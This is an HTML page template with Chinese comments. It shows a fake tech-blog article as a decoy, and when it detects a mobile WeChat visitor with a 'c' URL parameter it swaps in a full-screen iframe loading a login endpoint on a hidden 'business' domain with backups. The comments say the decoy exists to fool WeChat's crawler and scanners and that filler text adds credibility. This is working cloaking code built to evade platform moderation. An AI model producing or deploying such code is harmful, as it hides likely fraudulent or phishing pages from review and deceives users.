<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>技术前沿：数字协议解析</title>
    <style>
        /* 默认样式：显示伪装博客内容 */
        body { font-family: sans-serif; line-height: 1.6; color: #333; padding: 20px; background: #f4f4f4; }
        .blog-post { max-width: 800px; margin: auto; background: #fff; padding: 30px; border-radius: 8px; }
        
        /* 关键：全屏 Iframe 样式，初始隐藏 */
        #business-frame {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            border: none; z-index: 999999; background: #fff;
        }
    </style>
</head>
<body>
    <!-- 伪装内容：给微信爬虫和普通浏览器看的 -->
    <div class="blog-post" id="decoy-content">
        <h1>数字纪元的新范式解析</h1>
        <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要...</p>
        <p>（这里可以放长篇的技术文章，增加可信度）</p>
    </div>

    <!-- 业务容器：仅在微信内激活 -->
    <iframe id="business-frame"></iframe>

    <script>
        (function() {
            // 1. 设置你的业务域名池（支持多个备用）
            const businessDomains = [
                'https://1004.jdnews.cn', // 主域名
                'https://backup.jdnews.cn' // 备用域名
            ];

            const ua = navigator.userAgent.toLowerCase();
            const isWechat = ua.indexOf('micromessenger') !== -1;
            const isMobile = /iphone|ipad|ipod|android/.test(ua);

            // 2. 获取 URL 参数 (假设参数放在 c 里面)
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('c'); // 获取 ?c=... 后的内容

            if (isWechat && isMobile && encodedData) {
                // 3. 微信环境：激活全屏 Iframe
                const decoy = document.getElementById('decoy-content');
                const frame = document.getElementById('business-frame');
                
                // 拼接最终业务地址
                // 这里假设你的业务地址格式是：域名/index.php/api/...?token=xxx
                const targetUrl = businessDomains[0] + '/index.php/api/user.usermp/login?' + decodeURIComponent(encodedData);
                
                decoy.style.display = 'none';
                frame.style.display = 'block';
                frame.src = targetUrl;

                // 记录日志或处理通信
                console.log('WeChat environment detected, loading business iframe...');
            } else {
                // 4. 非微信环境：保持显示伪装博客，或者引导用户在微信打开
                console.log('Scanning or PC browser detected, showing decoy.');
            }
        })();
    </script>
</body>
</html>
